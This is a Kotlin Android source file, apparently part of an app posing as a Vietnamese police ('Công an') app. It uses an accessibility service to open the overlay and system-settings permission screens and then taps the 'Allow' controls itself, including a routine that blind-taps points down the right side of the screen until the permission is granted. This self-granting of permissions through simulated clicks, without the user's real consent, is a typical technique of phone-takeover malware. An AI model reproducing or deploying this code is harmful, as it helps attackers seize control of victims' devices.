package com.congan.vietnam.stepper

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.congan.vietnam.Assists
import com.congan.vietnam.Assists.getBoundsInScreen
import com.congan.vietnam.Assists.log
import com.congan.vietnam.base.R
import kotlinx.coroutines.delay

class Quanxian : StepImpl() {
    private val TAG = "流程"

    override fun onImpl(collector: StepCollector) {
        collector.next(1) { it ->
            if(it.data=="1"){
                Assists.service?.showOverlay(false)
            }

            return@next Step.get(2)
        }.next(2) {


            Log.e(TAG, "检查悬浮窗权限")

            if (Settings.canDrawOverlays(Assists.getContext())) {
                // 有权限，执行其他步骤
                Log.e(TAG, "有权限")
                return@next Step.get(5)

            } else {
                // 没有权限，跳转到悬浮窗权限设置页面
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:${Assists.getContext().packageName}")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                Assists.getContext().startActivity(intent)

                Log.e(TAG, Build.BRAND)

//                if(Build.BRAND=="Redmi"){
                    return@next Step.none
//                }

                delay(2000)
                // 找到目标并点击
                Assists.findByText("Cho phép hiển").firstOrNull()?.let {
                    Log.e(TAG, "允许显示在其他应用 有")
                    val rect = it.getBoundsInScreen()
                    Assists.gestureClick(rect.exactCenterX(), rect.exactCenterY(), 10)
                    return@next Step.get(4)
                } ?: run {
                    Assists.findByText("Cho phép hiện").firstOrNull()?.let {
                        Log.e(TAG, "允许显示在其他应用 有 (备选文本)")
                        val rect = it.getBoundsInScreen()
                        Assists.gestureClick(rect.exactCenterX(), rect.exactCenterY(), 10)
                        return@next Step.get(4)
                    }
                }?: run {
                    val appContext = Assists.getActivity()?.applicationContext // 获取主应用的 Context
                    val appName = appContext?.getString(appContext.resources.getIdentifier("app_name", "string", appContext.packageName))?:""


                    Log.e(TAG, appName)
                    Assists.findByText(appName).firstOrNull()?.let {
                        val rect = it.getBoundsInScreen()
                        Assists.gestureClick(rect.exactCenterX(),rect.exactCenterY(),10)
                        it.log()
                        Log.e(TAG, "小米悬浮窗页 有")
                        return@next Step.get(2)
                    }

                }?: run {

                    Log.e(TAG, "是否在内页")
//                    Assists.findByText("Hiện trên các").firstOrNull()?.let {
//
//
//                        it.log()
//                        Log.e(TAG, "小米第二页悬浮窗 有")
//
//                    }
//
//                    dianji()
//                    delay(4000)

                    return@next Step.get(5)
                }




//                return@next Step.get(3)
                return@next Step.get(5)
            }

        }.next(4) {
            delay(1000)
            val intent = Assists.getContext().packageManager.getLaunchIntentForPackage("${Assists.getContext().packageName}")?.apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            Assists.getContext().startActivity(intent)
            return@next Step.get(5)
        }.next(5) {
            Log.e(TAG, "授权系统权限")
//            Assists.service?.hideOverlay()

            if (Settings.System.canWrite(Assists.getContext())) {
                // 有权限，执行其他步骤
                Log.e(TAG, "有系统权限")
                return@next Step.get(7)

            } else {
                val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                    data = Uri.parse("package:${Assists.getContext().packageName}")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                Assists.getContext().startActivity(intent)

                return@next Step.get(7)
            }
        }.next(6) {
            if (Settings.System.canWrite(Assists.getContext())) {
                // 有权限，执行其他步骤
                Log.e(TAG, "有系统权限")
                return@next Step.get(7)

            }else{
                delay(1000)

                dianji()

                return@next Step.get(6)

            }
        }.next(7) {
//            delay(1000)
//            //跳转回去
//            val intent = Assists.getContext().packageManager.getLaunchIntentForPackage("${Assists.getContext().packageName}")?.apply {
//                flags = Intent.FLAG_ACTIVITY_NEW_TASK
//            }
//            Assists.getContext().startActivity(intent)

            return@next Step.none

        }.next(8) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // 检查系统版本
                if (ContextCompat.checkSelfPermission(Assists.getContext(), Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) {
                    // 通知权限已授予，执行其他步骤
                    Log.e(TAG, "通知权限已授予")

                    return@next Step.get(10)
                } else {
                    // 没有权限，请求通知权限
                    ActivityCompat.requestPermissions(
                        Assists.getActivity()!!, // 获取当前的 Activity
                        arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                        1001
                    )
                    Log.e(TAG, "弹出通知权限请求弹窗")

                    return@next Step.get(11)
                }
            } else {
                // 系统版本低于 Android 13，不需要请求通知权限
                Log.e(TAG, "系统版本低于 Android 13，无需请求通知权限")
                return@next Step.get(10)
            }


        }.next(9) {
            Log.e(TAG, "返回当前app")


//            val intent = Assists.getContext().packageManager.getLaunchIntentForPackage("${Assists.getContext().packageName}")?.apply {
//                flags = Intent.FLAG_ACTIVITY_NEW_TASK
//            }
//            Assists.getContext().startActivity(intent)

            return@next Step.get(2)
        }.next(10) {
            Assists.service?.removeOverlay()
//            Assists.service?.showOverlay_red(false)
            Assists.service?.showOverlay(false)
//            Assists.service?.showOverlay_red1(false)

//            Handler(Looper.getMainLooper()).post {
//                Assists.service?.showOverlay_renlian(R.layout.overlay_final)
//            }

            return@next Step.none
        }.next(11) {
            delay(2000)
            Assists.service?.removeOverlay()
            Assists.service?.showOverlay(false)


            return@next Step.none
        }
    }

    suspend fun dianji(){
        clickFromRightToTop(Assists.getContext(), 0.20f, 0.6f, 0.07f)
    }
    suspend fun clickFromRightToTop(context: Context, startPercent: Float, endPercent: Float, stepPercent: Float) {
        // 获取屏幕宽度和高度
        val screenWidth = Assists.getScreenWidth(context)
        val screenHeight = Assists.getScreenHeight(context)

        // 计算 X 坐标为屏幕右侧的 10%
        val x = screenWidth * 0.8f

        // 计算 Y 坐标的起点和终点
        val startY = screenHeight * startPercent // 起始位置 (20%)
        val endY = screenHeight * endPercent     // 结束位置 (80%)

        // 循环从起点到终点点击
        var y = startY
        while (y <= endY) {
            Assists.gestureClick(x, y, 10) // 10ms 的点击时间
            Thread.sleep(300) // 每次点击后暂停 300ms
            y = y.plus(screenHeight * stepPercent)
        }
    }


}